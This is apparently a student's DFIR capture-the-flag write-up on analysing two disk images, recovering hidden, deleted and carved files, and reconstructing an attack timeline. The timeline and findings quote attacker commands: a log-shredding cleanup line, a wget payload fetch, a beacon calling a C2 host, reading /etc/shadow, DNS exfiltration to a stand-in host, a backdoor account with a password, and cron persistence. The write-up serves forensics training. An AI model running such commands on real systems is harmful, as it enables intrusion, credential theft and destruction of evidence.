# Challenge 04 — Disk Forensics

## Overview

| Field | Details |
|-------|---------|
| Challenge | 04 — Disk Forensics |
| Category | Digital Forensics & Incident Response (DFIR) |
| Difficulty | Easy |
| Date | 2026-03-29 |
| Flags Captured | 5/5 |

## Scenario

Two disk images were recovered from a suspect workstation. The objective was to analyze both images for evidence of data theft and attack planning.

## Evidence Files

| File | Description |
|------|-------------|
| `suspicious.dd` | 32MB USB drive image |
| `deleted-files.img` | 16MB image containing deleted files |

## Tools Used

| Tool | Purpose |
|------|---------|
| `mount` | Mount disk images for analysis |
| `find` | Recursive file discovery |
| `ls` | Directory listing |
| `cat` | Read file contents |
| `strings` | Extract readable text from binary images |
| `foremost` | File carving from raw disk images |
| `base64` | Encode/decode binary files for transfer |

---

## What is Disk Forensics?

Disk forensics involves analyzing raw disk images to recover evidence. Unlike live system analysis, disk images are snapshots of storage media — including deleted files, hidden directories, and carved artifacts. A key principle is that deleting a file does not immediately erase its data from disk. The file system entry is removed but the raw data remains until overwritten, making forensic recovery possible.

---

## Flag 4.1 — Hidden Stolen Data File

**Question:** What is the full path of the hidden stolen data file?

**Commands:**
```bash
sudo mount -o ro,loop suspicious.dd /mnt
ls -laR /mnt
```

**What this does:**
- **`mount -o ro,loop`** — mounts the disk image read-only (`ro`) as a loopback device (`loop`) so we can browse it like a real filesystem without modifying it
- **`ls -laR`** — lists all files recursively (`R`), including hidden files (`-a` shows dotfiles)

**Finding:**
```
/mnt/documents/.secret/stolen-data.csv
```

**Analysis:**

Mounting the disk image and performing a recursive listing revealed a hidden directory `.secret` inside `/mnt/documents/`. Hidden directories start with a dot and are invisible in normal listings — only `ls -a` reveals them. Inside was `stolen-data.csv` containing the stolen data. The full path on the original disk was `/documents/.secret/stolen-data.csv`.

**Flag:** `FLAG{/documents/.secret/stolen-data.csv}`

**Screenshot:** `04-4_1-hidden-file.png`

---

## Flag 4.2 — Cleanup Script Analysis

**Question:** What files did the cleanup script target?

**Command:**
```bash
cat /mnt/tmp/cleanup.sh
```

**What this does:** reads the cleanup script left on the USB drive. Attackers often leave cleanup scripts behind to destroy evidence before leaving a compromised system.

**Finding:**
```bash
shred /var/log/*
```

**Analysis:**

The cleanup script contained a `shred` command targeting `/var/log/*`. Unlike a regular delete, `shred` overwrites file contents multiple times making recovery impossible. The glob pattern `*` targets all files in `/var/log/` — system logs, auth logs, apache logs, syslog — everything we used in Challenge 01 to reconstruct the attack. This explains why forensic preservation of logs before cleanup is critical in incident response.

**Flag:** `FLAG{/var/log/*}`

**Screenshot:** `04-4_2-cleanup-script.png`

---

## Flag 4.3 — Flag in Recovered Image

**Question:** What flag is hidden inside the carved image file?

**Commands:**
```bash
# Carve image files from the disk image
sudo foremost -t png,jpg,bmp,gif -i suspicious.dd -o /tmp/carved-sus

# Check what was carved
ls -laR /tmp/carved-sus

# Encode the carved image to base64 for transfer
base64 /tmp/carved-sus/png/00012416.png

# On local Kali machine — decode and save
cat > /tmp/flag.b64 << 'EOF'
<BASE64_DATA>
EOF
base64 -d /tmp/flag.b64 > ~/04-4_3-recovered-img.png

# Open the image
xdg-open ~/04-4_3-recovered-img.png
```

**What this does:**
- **`foremost`** — carves files from a raw disk image by looking for file headers and footers (magic bytes). It can recover files even if the filesystem has no record of them
- **`-t png,jpg,bmp,gif`** — specifies file types to carve
- **`base64`** — encodes the binary PNG to text so it can be copied from the remote server to the local machine since the lab had no GUI

**Analysis:**

Foremost successfully carved a PNG file (`00012416.png`) from `suspicious.dd`. Since the lab environment had no GUI or X server, the image could not be opened directly. It was base64-encoded on the remote machine, transferred to the local Kali machine, decoded using a heredoc to avoid invalid input errors, and then opened to reveal the flag embedded in the image.

**Flag:** `FLAG{recovered_evidence_img}`

**Screenshot:** `04-4_3-foremost-carved.png`, `04-4_3-recovered-img.png`

---

## Flag 4.4 — Deleted Credentials Recovery

**Question:** What credentials were recovered from the deleted file?

**Command:**
```bash
strings deleted-files.img | grep -i "pass\|admin\|user\|cred"
```

**What this does:**
- **`strings`** — extracts all readable text from the raw binary image
- **`grep -i`** — filters for credential-related keywords (case insensitive)

Even though `creds.txt` was deleted, its raw data was still present in the image because deletion only removes the filesystem entry — not the actual data.

**Finding:**
```
admin:FLAG{deleted_but_not_gone}
```

**Analysis:**

The deleted `creds.txt` file was fully recovered using strings analysis on the raw disk image. The file contained admin credentials — consistent with the credential harvesting activity identified in Challenges 01, 02, and 03. This demonstrates a fundamental forensic principle: deleting a file does not immediately erase its contents from disk, making forensic recovery possible until the sectors are overwritten.

**Flag:** `FLAG{deleted_but_not_gone}`

**Screenshot:** `04-4_4-deleted-creds.png`

---

## Flag 4.5 — Exfiltration Timeline

**Question:** When was the exfiltration scheduled?

**Command:**
```bash
strings deleted-files.img | grep -i -A5 -B5 "exfil\|2025\|midnight\|transfer\|send"
```

**What this does:**
- **`-A5`** — show 5 lines after each match (context after)
- **`-B5`** — show 5 lines before each match (context before)

This gives us surrounding context around each keyword match — essential for reading fragments of deleted files.

**Finding:**
```
OPERATION NIGHTFALL - CONFIDENTIAL
Exfiltration scheduled: 2025-11-15 02:00 UTC
Method: DNS tunnel
Targets: customer database, financial records
```

**Analysis:**

A deleted file `plan.txt` was recovered from the raw disk image. Despite being deleted, its contents were fully intact in the unallocated space. The file revealed the attacker's exfiltration plan — codenamed `OPERATION NIGHTFALL` — scheduled for `2025-11-15 02:00 UTC` via DNS tunnel targeting customer and financial data. This is consistent with the DNS exfiltration technique identified in Challenge 03 and the staged archive found in Challenge 02.

**Flag:** `FLAG{2025-11-15 02:00 UTC}`

**Screenshot:** `04-4_5-exfil-plan.png`

---

## Challenges Faced

- No GUI in the lab environment — prevented direct viewing of carved images
- Required base64 encoding to transfer binary files from remote to local machine
- Deleted files not visible through normal filesystem listing — required raw strings analysis
- Foremost carving required patience as it processes the entire disk image

---

## Full Attack Timeline (Challenges 01 + 02 + 03 + 04 Combined)

```
02:55:00 → Attacker scans with DirBuster (apache-access.log)
02:55:00 → Targeted port scan: 22, 80, 443, 8080, 3306 (capture.pcap)
03:30:00 → Web shell uploaded: /uploads/shell.php
03:31:00 → Web shell tested: id, whoami, cat /etc/passwd
03:32:00 → Payload downloaded: wget http://198.51.100.47/payload.elf
03:32:00 → Beacon executed: /tmp/.update/beacon -c 203.0.113.99 -p 443 -e aes256
03:33:00 → cat /etc/shadow via reverse shell
03:33:00 → Sensitive files exfiltrated to /var/tmp/.cache/exfil.tar.gz
03:33:00 → DNS exfiltration: stolen_credentials → evil-c2.example.com
03:33:00 → Backdoor user created: svc-backup (Sup3rS3cret!)
03:34:00 → SSH key added: /home/svc-backup/.ssh/authorized_keys
03:45:00 → Crontab edited: */5 * * * * /tmp/.hidden/beacon.sh
03:47:00 → C2 callback confirmed: 203.0.113.99:4444
03:50:00 → Rootkit loaded: rootkit_mod hiding PID 31337
→ Planned: OPERATION NIGHTFALL exfiltration on 2025-11-15 02:00 UTC via DNS tunnel
→ Evidence: Stolen data in /documents/.secret/stolen-data.csv on USB drive
→ Cleanup: shred /var/log/* script prepared to destroy evidence
```

---

## Key Takeaways

- Mounting disk images read-only preserves evidence integrity
- Hidden directories (dotfolders) require `ls -a` to discover
- Deleting files does not erase data — raw recovery is possible until sectors are overwritten
- File carving with foremost recovers artifacts even without filesystem records
- `shred` is more destructive than `rm` — attackers use it specifically to defeat forensics
- Base64 is an effective way to transfer binary files from restricted environments
- Disk evidence corroborates findings from logs, memory, and network forensics
